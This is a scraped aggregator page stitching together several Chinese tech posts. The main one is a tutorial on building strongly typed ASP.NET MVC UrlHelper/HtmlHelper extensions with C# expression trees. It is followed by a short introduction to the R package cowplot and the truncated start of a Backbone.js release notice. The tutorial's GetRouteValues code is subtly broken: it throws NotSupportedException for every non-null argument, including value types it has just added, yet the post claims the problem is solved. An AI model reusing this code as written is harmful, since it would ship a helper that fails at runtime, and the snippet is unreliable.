<p>&#x8868;&#x8FBE;&#x5F0F;&#x6811;&#x662F;LINQ To everything &#x7684;&#x57FA;&#x7840;&#xFF0C;&#x540C;&#x65F6;&#x5404;&#x79CD;&#x7C7B;&#x5E93;&#x7684;Fluent API&#x4E5F; &#x5927;&#x91CF;&#x4F7F;&#x7528;&#x4E86;Expression Tree&#x3002;&#x8FD8;&#x8BB0;&#x5F97;&#x6211;&#x5728;&#x4E0D;&#x61C2;expression tree&#x65F6;&#xFF0C;&#x5404;&#x79CD;&#x773C;&#x82B1;&#x7F2D;&#x4E71;&#x7684;API &#x770B;&#x7684;&#x6211;&#x5404;&#x79CD;&#x819C;&#x62DC;&#xFF0C;&#x5F53;&#x6211;&#x719F;&#x6089;expression tree &#x540E;&#x604D;&#x7136;&#x5927;&#x609F;&#xFF0C;&#x4E0D;&#x7528;&#x770B;&#x4EE3;&#x7801;&#x4E5F;&#x80FD;&#x77E5;&#x9053;&#x522B;&#x4EBA;&#x7684;API &#x662F;&#x5982;&#x4F55;&#x8BBE;&#x8BA1;&#x7684;(^_^)&#x3002; &#x63A5;&#x4E0B;&#x6765;&#x8FD9;&#x7BC7;&#x535A;&#x5BA2;&#x5C31;&#x8C08;&#x8C08;&#x5982;&#x4F55;&#x4F7F;&#x7528;expression tree&#x6269;&#x5C55;MVC&#x4E2D;&#x7684;HtmlHelper&#x548C;UrlHelper&#x3002;</p>
<p>&#x573A;&#x666F;</p>
<p>&#x5F53;&#x6211;&#x4EEC;&#x5728;MVC&#x4E2D;&#x751F;&#x6210;&#x4E00;&#x4E2A;action&#x7684;url&#x4F1A;&#x8FD9;&#x6837;&#x5199;&#xFF1A;var url=UrlHelper.Action(&quot;index&quot;, &quot;Home&quot;); &#x5982;&#x679C;&#x8981;render&#x4E00;&#x4E2A;action&#x65F6;&#x4F1A;&#x8FD9;&#x6837;&#x5199;&#xFF1A;Html.RenderAction(&quot;index&quot;, &quot;Home&quot;);</p>
<p>&#x8FD9;&#x6837;&#x7684;&#x5199;&#x6CD5;&#x7455;&#x75B5;&#x5728;&#x4E8E;&#x6211;&#x4EEC;&#x4F20;&#x9012;&#x4E86;&#x4E24;&#x4E2A;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;&#x7684;&#x53C2;&#x6570;&#x5728;&#x4EE3;&#x7801;&#x4E2D;&#xFF0C;&#x800C;&#x6211;&#x4EEC;&#x53C8;&#x514D;&#x4E0D;&#x4E86;&#x5BF9;action&#x548C;controller&#x505A;&#x91CD;&#x547D;&#x540D;&#x64CD;&#x4F5C;&#xFF1A;index-&gt;default, &#x5373;&#x4FBF;&#x662F;&#x4F60;&#x7528;resharper&#x8FD9;&#x6837;&#x7684;&#x5DE5;&#x5177;&#x91CD;&#x547D;&#x540D;&#x4E5F;&#x65E0;&#x6CD5;&#x5C06;UrlHelper.Action(&quot;index&quot;, &quot;Home&quot;); &#x6539;&#x53D8;&#x4E3A;UrlHelper.Action(&quot;default&quot;, &quot;Home&quot;);</p>
<p>vs&#x751A;&#x81F3;&#x5728;&#x7F16;&#x8BD1;&#x65F6;&#x90FD;&#x4E0D;&#x4F1A;&#x68C0;&#x67E5;&#x51FA;&#x6765;&#x8FD9;&#x4E2A;&#x9519;&#x8BEF;&#x3002; &#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x7684;&#x76EE;&#x6807;&#x662F;&#xFF1A;&#x8BBE;&#x8BA1;&#x51FA;&#x5177;&#x6709;&#x9759;&#x6001;&#x68C0;&#x67E5;&#x7684;API&#xFF0C;&#x8BA9;vs &#x63D0;&#x793A;&#x51FA;&#x8FD9;&#x4E2A;&#x9519;&#x8BEF;&#x6765;&#xFF0C;&#x751A;&#x81F3;&#x662F;&#x91CD;&#x547D;&#x540D;&#x65F6;&#x76F4;&#x63A5;&#x628A;&#x76F8;&#x5173;&#x4EE3;&#x7801;&#x90FD;&#x80FD;&#x91CD;&#x547D;&#x540D;&#x3002;</p>
<p>&#x4F7F;&#x7528;Expression Tree &#x91CD;&#x65B0;&#x8BBE;&#x8BA1;&#x8FD9;&#x4E24;&#x7EC4;API</p>
<p>&#x76EE;&#x6807;&#xFF1A;&#x8BBE;&#x8BA1;&#x51FA;&#x7C7B;&#x4F3C;&#x7684;API&#xFF1A;Url.Action((HomeController c) =&gt; c.Index());</p>
<h4 id="1-&#x5F88;&#x660E;&#x663E;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x5728;UrlHelper&#x4E0A;&#x5199;&#x4E2A;&#x6269;&#x5C55;&#x65B9;&#x6CD5;&#xFF1A;">1.&#x5F88;&#x660E;&#x663E;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x5728;UrlHelper&#x4E0A;&#x5199;&#x4E2A;&#x6269;&#x5C55;&#x65B9;&#x6CD5;&#xFF1A;</h4><pre><code><span class="keyword">public</span> static <span class="built_in">string</span> Action<span class="subst">&amp;</span><span class="literal">lt</span>;TController<span class="subst">&amp;</span><span class="literal">gt</span>;(
        this UrlHelper url,
        Expression<span class="subst">&amp;</span><span class="literal">lt</span>;Func<span class="subst">&amp;</span><span class="literal">lt</span>;TController, ActionResult<span class="subst">&amp;</span><span class="literal">gt</span>;<span class="subst">&amp;</span><span class="literal">gt</span>; actionSelector,
        <span class="built_in">string</span> protocol <span class="subst">=</span> <span class="built_in">null</span>,
        <span class="built_in">string</span> hostname <span class="subst">=</span> <span class="built_in">null</span>)
        {
            <span class="built_in">var</span> action <span class="subst">=</span> <span class="subst">&amp;</span>quot;Index<span class="subst">&amp;</span>quot;; <span class="comment">//&amp;#x5F85;&amp;#x89E3;&amp;#x6790;</span>
            <span class="built_in">var</span> controller <span class="subst">=</span> <span class="subst">&amp;</span>quot;Home<span class="subst">&amp;</span>quot;;<span class="comment">//&amp;#x5E26;&amp;#x89E3;&amp;#x6790;</span>
            <span class="built_in">var</span> routeValues <span class="subst">=</span> <span class="literal">new</span> RouteValueDictionary();<span class="comment">//&amp;#x5F85;&amp;#x89E3;&amp;#x6790;</span>

            <span class="keyword">return</span> url<span class="built_in">.</span>Action(action, controller, routeValues, protocol, hostname);
        }
</code></pre><p>&#x73B0;&#x5728;&#x53EA;&#x9700;&#x8981;&#x6839;&#x636E;&#x8868;&#x8FBE;&#x5F0F;Expression&lt;Func&lt;TController, ActionResult&gt;&gt; actionSelector &#x89E3;&#x6790;&#x51FA;action,controller,&#x8FD8;&#x6709;routeValues&#x5373;&#x53EF;</p>
<h4 id="2-&#x89E3;&#x6790;&#x51FA;controller_&#x7684;&#x540D;&#x79F0;">2.&#x89E3;&#x6790;&#x51FA;controller &#x7684;&#x540D;&#x79F0;</h4><p>&#x5206;&#x6790;&#xFF1A;controller&#x7684;&#x540D;&#x79F0;&#x53EF;&#x4EE5;&#x6839;&#x636E;&#x6CDB;&#x578B;&#x65B9;&#x6CD5;&#x4E2D;&#x7684;&#x6CDB;&#x578B;&#x53C2;&#x6570;TController&#x5F97;&#x5230;</p>
<pre><code><span class="keyword">private</span> static string GetControllerName(<span class="keyword">Type</span> controllerType)
        {
            var controllerName = controllerType.<span class="keyword">Name</span>.EndsWith(&amp;quot;Controller&amp;quot;)
                ? controllerType.<span class="keyword">Name</span>.Substring(<span class="number">0</span>, controllerType.<span class="keyword">Name</span>.Length - &amp;quot;Controller&amp;quot;.Length)
                : controllerType.<span class="keyword">Name</span>;
            <span class="keyword">return</span> controllerName;
        }
</code></pre><h4 id="3-&#x89E3;&#x6790;action&#x7684;&#x540D;&#x79F0;">3.&#x89E3;&#x6790;action&#x7684;&#x540D;&#x79F0;</h4><p>&#x5206;&#x6790;&#xFF1A;&#x7531;&#x4E8E;&#x8868;&#x8FBE;&#x5F0F;Expression&lt;Func&lt;TController, ActionResult&gt;&gt; actionSelector &#x662F;&#x4E00;&#x4E2A;MethodCallExpression, &#x6240;&#x4EE5;&#x53EF;&#x4EE5;&#x5F88;&#x5BB9;&#x6613;&#x5F97;&#x5230;action&#x7684;&#x540D;&#x79F0;&#xFF1A;var action=call.Method.Name;</p>
<p>&#x8FD9;&#x6837;&#x5DF2;&#x7ECF;&#x5B8C;&#x6210;&#x4E86;&#x6700;&#x7B80;&#x5355;&#x7684;url&#x6784;&#x9020;&#x65B9;&#x6848;&#xFF0C; <em>&#x4F46;&#x662F;&#x6211;&#x4EEC;&#x8FD8;&#x6CA1;&#x6709;&#x5904;&#x7406;&#x5E26;&#x6709;&#x53C2;&#x6570;&#x7684;action&#x7C7B;&#x578B;&#xFF1A;Url.Action((HomeController c) =&gt; c.Detail(10, 20));</em></p>
<h4 id="4-&#x89E3;&#x6790;routeValues">4.&#x89E3;&#x6790;routeValues</h4><p>&#x5206;&#x6790;&#xFF1A;action&#x4E2D;&#x7684;&#x53C2;&#x6570;&#x5B9E;&#x9645;&#x4E0A;&#x5C31;&#x65F6;&#x8FD9;&#x4E2A;MethodCallExpression&#x4E2D;&#x7684;&#x53C2;&#x6570;&#xFF0C;&#x6211;&#x4EEC;&#x89E3;&#x6790;&#x8FD9;&#x4E2A;expression&#x7684;&#x53C2;&#x6570;&#x5373;&#x53EF;&#xFF0C;&#x7136;&#x540E;&#x5F97;&#x5230;RouteValues</p>
<pre><code><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> RouteValueDictionary <span class="title">GetRouteValues</span>(<span class="params">MethodCallExpression call</span>)
</span>{
    <span class="keyword">var</span> routeValues = <span class="keyword">new</span> RouteValueDictionary();
    <span class="keyword">var</span> args = call.Arguments;
    ParameterInfo[] parameters = call.Method.GetParameters();
    <span class="keyword">var</span> pairs = args.Select((a, i) =&amp;gt; <span class="keyword">new</span>
    {
        Argument = a,
        ParamName = parameters[i].Name
    });
    <span class="keyword">foreach</span> (<span class="keyword">var</span> argumentParameterPair <span class="keyword">in</span> pairs)
    {
        <span class="keyword">string</span> name = argumentParameterPair.ParamName;
        <span class="keyword">object</span> <span class="keyword">value</span> = argumentParameterPair.Argument.GetValue();
        <span class="keyword">if</span> (<span class="keyword">value</span> != <span class="keyword">null</span>)
        {
            <span class="keyword">var</span> valueType = <span class="keyword">value</span>.GetType();
            <span class="keyword">if</span> (valueType.IsValueType)
            {
                routeValues.Add(name, <span class="keyword">value</span>);
            }
            <span class="keyword">throw</span> <span class="keyword">new</span> NotSupportedException(&amp;quot;unsoupported parameter type {<span class="number">0</span>}&amp;quot;.FormatWith(<span class="keyword">value</span>.ToString()));
        }
    }
    <span class="keyword">return</span> routeValues;
}
</code></pre><p>&#x5982;&#x6B64;&#x4E00;&#x6765;&#xFF0C;&#x7C7B;&#x4F3C;Url.Action((HomeController c) =&gt; c.Detail(10, 20));&#x8FD9;&#x6837;&#x7684;action&#x4E5F;&#x53EF;&#x4EE5;&#x6784;&#x9020;&#x51FA;Url&#x4E86;, &#x76EE;&#x524D;&#x8FD9;&#x4E2A;&#x89E3;&#x6790;&#x5BF9;&#x4E8E;&#x4F20;&#x5165;&#x590D;&#x6742;&#x7C7B;&#x578B;&#x7684;action&#x662F;&#x4E0D;&#x652F;&#x6301;&#x7684;&#xFF0C;&#x5982;&#x4E0B;&#x4EE3;&#x7801;&#x4EC5;&#x4EC5;&#x652F;&#x6301;&#x7B80;&#x5355;&#x7C7B;&#x578B;&#x7684;&#x53C2;&#x6570;:</p>
<pre><code><span class="keyword">if</span> (valueType.IsValueType)
      {
          routeValues.Add(<span class="keyword">name</span>, <span class="keyword">value</span>);
      }
</code></pre><p>&#x5BF9;&#x4E8E;action&#x4E2D;&#x4F20;&#x5165;&#x590D;&#x6742;&#x7684;&#x7C7B;&#x578B;&#xFF1A;&#x5982;&#x4F20;&#x5165;&#x4E00;&#x4E2A;&#x7C7B;&#x578B;&#x4E3A;&#xFF1A;</p>
<pre><code><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">User</span>
    {
        <span class="keyword">public</span> <span class="keyword">int</span> Age { <span class="keyword">get</span>; <span class="keyword">set</span>; }
        <span class="keyword">public</span> <span class="keyword">string</span> Email { <span class="keyword">get</span>; <span class="keyword">set</span>; }
    }
</code></pre><p>&#x7684;&#x53C2;&#x6570;&#x5230;Action&#x4E2D;&#xFF0C;</p>
<pre><code><span class="keyword">public</span> <span class="function">ActionResult <span class="title">SayHelloToUser</span><span class="params">(User user)</span>
        </span>{
            <span class="keyword">return</span> <span class="keyword">new</span> EmptyResult();
        }
</code></pre><p>&#x6211;&#x4EEC;&#x8FD8;&#x9700;&#x8981;&#x7EE7;&#x7EED;&#x89E3;&#x6790;&#x8FD9;&#x79CD;&#x7C7B;&#x578B;&#x7684;&#x503C;&#x5230;RouteValues&#x4E2D;&#xFF0C;</p>
<pre><code><span class="keyword">var</span> properties = PropertyInfoHelper.GetProperties(valueType);
   <span class="keyword">foreach</span> (<span class="keyword">var</span> propertyInfo <span class="keyword">in</span> properties)
     {
        routeValues.Add(propertyInfo.Name, propertyInfo.GetValue(<span class="keyword">value</span>));
     }
</code></pre><p>&#x5927;&#x529F;&#x544A;&#x6210;&#xFF0C;&#x73B0;&#x5728;&#x5DF2;&#x7ECF;&#x5B8C;&#x7F8E;&#x89E3;&#x51B3;&#x4E86;&#x5404;&#x79CD;&#x7C7B;&#x578B;&#x7684;&#x53C2;&#x6570;&#x4F20;&#x5165;&#x3002;</p>
<p>&#x540C;&#x6837;&#x7684;&#x9053;&#x7406;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x6269;&#x5C55;HtmlHelper &#x7684; RenderAction(), ActionLink()&#x2026;.</p>
<p>&#x7F3A;&#x9677;</p>
<p>&#x65E9;&#x5728;09&#x5E74;&#xFF0C;jeffery zhao&#x5C31;&#x53D1;&#x8868;&#x4E86;lambda&#x65B9;&#x5F0F;&#x751F;&#x6210;url&#x7684;&#x535A;&#x5BA2;&#xFF0C; <a href="http://www.cnblogs.com/JeffreyZhao/archive/2009/11/02/several-ways-of-generating-url-benchmark-result.html" target="_blank" rel="external">&#x5BF9;&#x6BD4;&#x4E86;&#x51E0;&#x79CD;&#x65B9;&#x6848;&#x7684;&#x6027;&#x80FD;&#x95EE;&#x9898;</a> &#xFF0C;&#x5E76;&#x4E14;&#x7ED9;&#x51FA;&#x4E86;&#x4F18;&#x5316;&#x65B9;&#x6848;,&#x5F53;&#x7136;&#xFF0C;&#x6211;&#x5728;&#x5199;&#x8FD9;&#x7BC7;&#x535A;&#x5BA2;&#x7684;&#x65F6;&#x5019;&#x8FD8;&#x6CA1;&#x6709;&#x771F;&#x6B63;&#x5C1D;&#x8BD5;&#x53BB;&#x4F18;&#x5316;&#x8FD9;&#x4E2A;&#x65B9;&#x6848;&#xFF0C;&#x53EA;&#x662F;&#x518D;&#x6B21;&#x62DC;&#x8BFB;&#x4E86;&#x5927;&#x795E;&#x7684;&#x65B9;&#x6848;&#xFF0C;&#x8BB0;&#x5F97;&#x65E9;&#x4E9B;&#x5E74;&#x5C31;&#x8BFB;&#x8FC7;&#x8FD9;&#x4E9B;&#x6587;&#x7AE0;&#xFF0C;&#x4F46;&#x662F;&#x4ECA;&#x5929;&#x91CD;&#x65B0;&#x8BFB;&#x8FC7;&#x4ECD;&#x7136;&#x83B7;&#x76CA;&#x532A;&#x6D45;&#xFF0C;&#x4E0D;&#x7531;&#x5F97;&#x611F;&#x53F9;&#x51E0;&#x53E5;&#xFF0C;&#x83AB;&#x975E;&#x8DD1;&#x9898;&#x4E86;;-);-) </p>
<p>&#x63A5;&#x4E0B;&#x6765;&#x6211;&#x4F1A;&#x601D;&#x8003;&#x8FD9;&#x4E2A;&#x4F18;&#x5316;&#x7684;&#x95EE;&#x9898;&#x3002;</p>
<p>&#x7ED3;&#x675F;&#x8BED;&#xFF1A;&#x672C;&#x6587;&#x4F7F;&#x7528;Expression tree &#x6269;&#x5C55;&#x4E86;HtmlHelper&#x548C;UrlHelper,&#x7ED9;&#x51FA;&#x4E86;&#x4E00;&#x4E2A;&#x5177;&#x6709;&#x9759;&#x6001;&#x68C0;&#x67E5;&#x7684;API&#x5B9E;&#x73B0;&#x65B9;&#x5F0F;&#x3002; <a href="http://files.cnblogs.com/files/richieyang/UsingExpressionTree.rar" target="_blank" rel="external">&#x672C;&#x6587;&#x7AE0;&#x6240;&#x4F7F;&#x7528;&#x7684;&#x6E90;&#x7801;&#x63D0;&#x4F9B;&#x4E0B;&#x8F7D;</a> &#xFF0C;&#x8F6C;&#x8F7D;&#x8BF7;&#x6CE8;&#x660E;&#x51FA;&#x5904; </p>
<p>&#x8D5E;&#x4E00;&#x4E2A; &#x6536; &#x85CF; </p>
<p> &#x63A8;&#x8350;&#x6587;&#x7AE0;</p>
<ul>
<li>1.<a href="/articles/2IJrai">&#x5341;&#x4E94;&#x5929;&#x7CBE;&#x901A;WCF&#x2014;&#x2014;&#x7B2C;&#x4E00;&#x5929; &#x4E09;&#x79CD;Binding&#x8BA9;&#x4F60;KO80%&#x7684;&#x4E1A;&#x52A1;</a></li>
<li>2.<a href="/articles/EFzIJvR">&#x4E00;&#x4E2A;&#x7528;Json&#x683C;&#x5F0F;&#x6765;&#x53D1;&#x9001;&#x4E00;&#x4E2A;Post&#x8BF7;&#x6C42;&#x5230;WCF&#x670D;&#x52A1;</a></li>
<li>3.<a href="/articles/qaaAjee">&#x6839;&#x636E;C# &#x4E8B;&#x4EF6;&#x601D;&#x60F3;&#x6765;&#x5B9E;&#x73B0; php &#x4E8B;&#x4EF6;</a></li>
<li>4.<a href="/articles/yIvUrmi">Restful&#x98CE;&#x683C;wcf&#x8C03;&#x7528;3&#x2014;&#x2014;Stream</a></li>
<li>5.<a href="/articles/RJrUN3F">Aspose.Tasks for .NET 8.4.1 &#x53D1;&#x5E03;</a></li>
<li><p>6.<a href="/articles/nYriY3B">[.net &#x9762;&#x5411;&#x5BF9;&#x8C61;&#x7F16;&#x7A0B;&#x57FA;&#x7840;] (14) &#x91CD;&#x6784;</a></p>
<p>&#x76F8;&#x5173;&#x5FAE;&#x535A; <a href="/articles/weibo_list/ai6vYjv">()</a></p>
</li>
</ul>
<h5 id="&#x6211;&#x6765;&#x8BC4;&#x51E0;&#x53E5;">&#x6211;&#x6765;&#x8BC4;&#x51E0;&#x53E5;</h5><p>&#x9519;&#x8BEF; </p>
<p> &#x767B;&#x5F55;&#x540E;&#x8BC4;&#x8BBA; &#x5DF2;&#x53D1;&#x8868;&#x8BC4;&#x8BBA;&#x6570;( ) </p>
<p>&#x6CA1;&#x6709;&#x66F4;&#x591A;&#x8BC4;&#x8BBA;&#x4E86;^^ </p>
<p>&#x66F4;&#x591A;&#x8BC4;&#x8BBA;</p>
<p>&#x8BC4;&#x8BBA;&#x52A0;&#x8F7D;&#x5931;&#x8D25;&#xFF0C;<a href="javascript:reload_comments(&apos;ai6vYjv&apos;,1,0,-1);" target="_blank" rel="external">&#x91CD;&#x65B0;&#x52A0;&#x8F7D;</a></p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/transcribe/">transcribe</a>
</div>


  <div class="article-tags">
  
  <span></span> <a href="/tags/Net/">.Net</a><a href="/tags/MVC模式/">MVC模式</a>
  </div>

</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2015/06/07/65ee54a/" title="cowplot：基于ggplot的可视化系统 -" itemprop="url">cowplot：基于ggplot的可视化系统 -</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="edwin" target="_blank" itemprop="author">edwin</a>
		
  <p class="article-time">
    <time datetime="2015-06-06T22:24:37.000Z" itemprop="datePublished"> 发表于 2015-06-07</time>
    
  </p>
</header>
    <div class="article-content">
        
        <h1 id="cowplot&#xFF1A;&#x57FA;&#x4E8E;ggplot&#x7684;&#x53EF;&#x89C6;&#x5316;&#x7CFB;&#x7EDF;">cowplot&#xFF1A;&#x57FA;&#x4E8E;ggplot&#x7684;&#x53EF;&#x89C6;&#x5316;&#x7CFB;&#x7EDF;</h1><p> &#x65F6;&#x95F4;&#xA0;2015-06-07 10:55:58  <a href="/sites/iE32am">Biostack.org</a></p>
<p><em>&#x539F;&#x6587;</em>&#xA0; <a href="http://www.biostack.org/?p=175&amp;utm_source=tuicool" target="_blank" rel="external">http://www.biostack.org/?p=175</a></p>
<p> &#x4E3B;&#x9898; <a href="/topics/11080136">ggplot2</a><a href="/topics/11100078">&#x52A0;&#x5BC6;&#x89E3;&#x5BC6;</a></p>
<h4 id="GitHub_&#x4E3B;&#x9875;&#xFF1A;">GitHub &#x4E3B;&#x9875;&#xFF1A;</h4><p><a href="https://github.com/wilkelab/cowplot" target="_blank" rel="external">https://github.com/wilkelab/cowplot</a></p>
<h4 id="CRAN_&#x5305;&#x5730;&#x5740;&#xFF1A;">CRAN &#x5305;&#x5730;&#x5740;&#xFF1A;</h4><p><a href="http://cran.r-project.org/web/packages/cowplot/index.html" target="_blank" rel="external">http://cran.r-project.org/web/packages/cowplot/index.html</a></p>
<h4 id="&#x5305;&#x63CF;&#x8FF0;&#xFF1A;">&#x5305;&#x63CF;&#x8FF0;&#xFF1A;</h4><p>The cowplot package is a simple add-on to ggplot2. It is meant to provide a publication-ready theme for ggplot2, one that requires a minimum amount of fiddling with sizes of axis labels, plot backgrounds, etc. Its primary purpose is to give my students and postdocs an easy way to make figures that I will approve of. Thus, this package meets my personal needs and tastes. Yours may be different.</p>
<p>Some helpful extensions and modifications to the &#x2018;ggplot2&#x2032; library. In particular, this package makes it easy to combine multiple &#x2018;ggplot2&#x2032; plots into one and label them with letters, e.g. A, B, C, etc., as is often required for scientific publications. The package also provides a streamlined and clean theme that is used in the Wilke lab, hence the package name, which stands for Claus O. Wilke&#x2019;s plot library.</p>
<h4 id="&#x5305;&#x89E3;&#x8BFB;&#xFF1A;">&#x5305;&#x89E3;&#x8BFB;&#xFF1A;</h4><p>&#x73B0;&#x5728;&#x6BCF;&#x6B21;&#x7ED8;&#x5236;GGplot&#x7684;&#x56FE;&#xFF0C;&#x90FD;&#x4F1A;&#x4F7F;&#x7528; theme_bw&#xFF08;&#xFF09;&#x53BB;&#x9664;&#x7070;&#x8272;&#x7684;&#x80CC;&#x666F;&#x4FE1;&#x606F;&#xFF0C;&#x73B0;&#x5728;&#x4F7F;&#x7528;cowplot &#x4F3C;&#x4E4E;&#x53D8;&#x7684;&#x5F88;&#x7B80;&#x5355;&#xFF0C;&#x56FE;&#x7684;&#x6392;&#x5217;&#x548C;&#x6CE8;&#x91CA;&#x4E5F;&#x53D8;&#x5F97;&#x5F88;&#x7B80;&#x5355;&#x3002;</p>
<h4 id="&#x4EE3;&#x7801;&#x5B9E;&#x4F8B;&#xFF1A;">&#x4EE3;&#x7801;&#x5B9E;&#x4F8B;&#xFF1A;</h4><p>&#x4EE3;&#x7801;&#xFF1A;</p>
<pre><code>library<span class="params">(ggplot2)</span>
require<span class="params">(cowplot)</span>
plot.mpg &amp;lt;- ggplot<span class="params">(mpg, aes<span class="params">(x = cty, y = hwy, colour = factor<span class="params">(cyl)</span>)</span>)</span> +
            geom_point<span class="params">(size=<span class="number">2.5</span>)</span>
plot.diamonds &amp;lt;- ggplot<span class="params">(diamonds, aes<span class="params">(clarity, fill = cut)</span>)</span> +
                 geom_bar<span class="params">()</span> +
                 theme<span class="params">(axis.text.x = element_text<span class="params">(angle=<span class="number">70</span>, vjust=<span class="number">0.5</span>)</span>)</span>
plot.iris &amp;lt;- ggplot<span class="params">(iris, aes<span class="params">(Sepal.Length, Sepal.Width)</span>)</span> +
             geom_point<span class="params">()</span> + facet_grid<span class="params">(. ~ Species)</span> +
             stat_smooth<span class="params">(method = &amp;quot;lm&amp;quot;)</span> +
             background_grid<span class="params">(major = &amp;apos;y&amp;apos;, minor = &amp;quot;none&amp;quot;)</span> +
             panel_border<span class="params">()</span>
ggdraw<span class="params">()</span> +
  draw_plot<span class="params">(plot.iris, <span class="number">0</span>, .<span class="number">5</span>, <span class="number">1</span>, .<span class="number">5</span>)</span> +
  draw_plot<span class="params">(plot.mpg, <span class="number">0</span>, <span class="number">0</span>, .<span class="number">5</span>, .<span class="number">5</span>)</span> +
  draw_plot<span class="params">(plot.diamonds, .<span class="number">5</span>, <span class="number">0</span>, .<span class="number">5</span>, .<span class="number">5</span>)</span> +
  draw_plot_label<span class="params">(c<span class="params">(&amp;quot;A&amp;quot;, &amp;quot;B&amp;quot;, &amp;quot;C&amp;quot;)</span>, c<span class="params">(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0.5</span>)</span>, c<span class="params">(<span class="number">1</span>, <span class="number">0.5</span>, <span class="number">0.5</span>)</span>, size = <span class="number">15</span>)</span>
</code></pre><p>&#x7ED3;&#x679C;&#xFF1A;</p>
<p><img src="http://img2.tuicool.com/uQNzU3.png" alt=""></p>
<p>&#x8D5E;&#x4E00;&#x4E2A; &#x6536; &#x85CF; </p>
<p> &#x63A8;&#x8350;&#x6587;&#x7AE0;</p>
<ul>
<li>1.<a href="/articles/32yMNjq">&#x8FC7;&#x53BB;&#x4E00;&#x5468;&#x864E;&#x55C5;&#x4E0A;&#x7684;&#x5341;&#x7BC7;&#x70ED;&#x6587; (6.1&#x2014;6.7)</a></li>
<li>2.<a href="/articles/V7Vn6ry">&#x5BF9;&#x8BDD;&#x5EB7;&#x590F;&#xFF1A;&#x5929;&#x5802;&#x7684;19&#x5929;&#x548C;&#x5730;&#x72F1;&#x7684;24&#x5C0F;&#x65F6;</a></li>
<li>3.<a href="/articles/nEzUzqM">&#x770B;&#x5230;&#x8FD9;&#x4E9B;&#x673A;&#x5668;&#x4EBA;&#x6454;&#x5012;&#xFF0C;&#x4F60;&#x5FC3;&#x91CC;&#x662F;&#x4EC0;&#x4E48;&#x611F;&#x89C9;&#xFF1F;</a></li>
<li>4.<a href="/articles/f2uiQbN">&#x5173;&#x7FBD;&#x90FD;&#x60CA;&#x5446;&#x4E86;&#xFF1A;&#x5728;&#x5F00;&#x9885;&#x624B;&#x672F;&#x4E2D;&#x5F39;&#x5409;&#x4ED6;&#x7684;&#x7537;&#x4EBA;</a></li>
<li>5.<a href="/articles/B7RF7jm">&#x91D1;&#x87B3;&#x8782;&#x7535;&#x5546;&#x505A;&#x5927;&#x4E92;&#x8054;&#x7F51;&#x5BB6; &#x4E1A;&#x7EE9;&#x76EE;&#x6807;&#x76F4;&#x6307;50&#x4EBF;&#x5143;</a></li>
<li><p>6.<a href="/articles/YbQbMv">&#x987A;&#x4E30;&#x97F5;&#x8FBE;&#x7B49;&#x6295;&#x8D44;5&#x4EBF;&#x5143;&#x6210;&#x7ACB;&#x65B0;&#x516C;&#x53F8; &#x8FD0;&#x8425;&#x81EA;&#x52A9;&#x6536;&#x5BC4;</a></p>
<p>&#x76F8;&#x5173;&#x5FAE;&#x535A; <a href="/articles/weibo_list/vEn6Fr">()</a></p>
</li>
</ul>
<h5 id="&#x6211;&#x6765;&#x8BC4;&#x51E0;&#x53E5;">&#x6211;&#x6765;&#x8BC4;&#x51E0;&#x53E5;</h5><p>&#x9519;&#x8BEF; </p>
<p> &#x767B;&#x5F55;&#x540E;&#x8BC4;&#x8BBA; &#x5DF2;&#x53D1;&#x8868;&#x8BC4;&#x8BBA;&#x6570;( ) </p>
<p>&#x6CA1;&#x6709;&#x66F4;&#x591A;&#x8BC4;&#x8BBA;&#x4E86;^^ </p>
<p>&#x66F4;&#x591A;&#x8BC4;&#x8BBA;</p>
<p>&#x8BC4;&#x8BBA;&#x52A0;&#x8F7D;&#x5931;&#x8D25;&#xFF0C;<a href="javascript:reload_comments(&apos;vEn6Fr&apos;,1,0,-1);" target="_blank" rel="external">&#x91CD;&#x65B0;&#x52A0;&#x8F7D;</a></p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/transcribe/">transcribe</a>
</div>


  <div class="article-tags">
  
  <span></span> <a href="/tags/ggplot2/">ggplot2</a><a href="/tags/加密解密/">加密解密</a>
  </div>

</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2015/06/07/662b369/" title="Backbone.js 1.2.1 发布，JavaScript 的 MVC 框架 -" itemprop="url">Backbone.js 1.2.1 发布，JavaScript 的 MVC 框架 -</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="edwin" target="_blank" itemprop="author">edwin</a>
		
  <p class="article-time">
    <time datetime="2015-06-06T22:24:37.000Z" itemprop="datePublished"> 发表于 2015-06-07</time>
    
  </p>
</header>
    <div class="article-content">
        
        <h1 id="Backbone-js_1-2-1_&#x53D1;&#x5E03;&#xFF0C;JavaScript_&#x7684;_MVC_&#x6846;&#x67B6;">Backbone.js 1.2.1 &#x53D1;&#x5E03;&#xFF0C;JavaScript &#x7684; MVC &#x6846;&#x67B6;</h1><p> &#x65F6;&#x95F4;&#xA0;2015-06-07 08:07:23  <a href="/sites/JNzQre">&#x5F00;&#x6E90;&#x4E2D;&#x56FD;&#x65B0;&#x95FB;</a></p>
<p><em>&#x539F;&#x6587;</em>&#xA0; <a href="http://www.oschina.net/news/63144/backbone-js-1-2-1?utm_source=tuicool" target="_blank" rel="external">http://www.oschina.net/news/63144/backbone-js-1-2-1</a></p>
<p> &#x4E3B;&#x9898; <a href="/topics/11060048">Backbone.js</a><a href="/topics/11080033">MVC&#x6A21;&#x5F0F;</a></p>
